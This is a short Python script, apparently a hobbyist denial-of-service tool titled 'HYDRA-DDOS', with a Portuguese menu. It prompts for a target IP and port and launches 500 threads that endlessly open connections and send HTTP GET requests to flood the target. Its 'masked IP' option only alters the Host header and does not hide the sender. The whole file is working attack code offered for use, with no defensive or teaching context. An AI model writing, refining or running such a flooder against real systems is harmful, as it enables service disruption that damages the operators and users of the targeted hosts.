from colorama import init, Fore, Style
import socket
import threading
import random

def HOME():
    # Inicializa o colorama
    init()

    arte_ascii = r"""
██╗░░██╗██╗░░░██╗██████╗░██████╗░░█████╗░░░░░░░██████╗░██████╗░░█████╗░░██████╗
██║░░██║╚██╗░██╔╝██╔══██╗██╔══██╗██╔══██╗░░░░░░██╔══██╗██╔══██╗██╔══██╗██╔════╝
███████║░╚████╔╝░██║░░██║██████╔╝███████║█████╗██║░░██║██║░░██║██║░░██║╚█████╗░
██╔══██║░░╚██╔╝░░██║░░██║██╔══██╗██╔══██║╚════╝██║░░██║██║░░██║██║░░██║░╚═══██╗
██║░░██║░░░██║░░░██████╔╝██║░░██║██║░░██║░░░░░░██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═╝░░╚═╝░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝░░░░░░╚═════╝░╚═════╝░░╚════╝░╚═════╝░
"""

    print(Fore.MAGENTA + arte_ascii + Style.RESET_ALL)

def escolhas():
    print("O que deseja?")
    print("[01] Ataque/attack")
    print("[00] sair/quit")
    escolha = input("$ ")

    if escolha == "01":
        print("Ok.")
        iniciar_ataque()
    else:
        quit()

def iniciar_ataque():
    target = input('Insira o IP de destino: ')
    fake_ip = input('Insira seu IP mascarado ou digite R para escolher aleatoriamente: ')
    port = int(input('Insira a porta: '))

    if fake_ip.lower() == 'r':
        fake_ip = f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
        print(f"IP mascarado aleatório gerado: {fake_ip}")

    attack_num = 0

    def attack():
        nonlocal attack_num
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

            attack_num += 1
            print(attack_num)

            s.close()

    for i in range(500):
        thread = threading.Thread(target=attack)
        thread.start()

# Executa a função HOME e exibe o menu de escolhas
HOME()
escolhas()
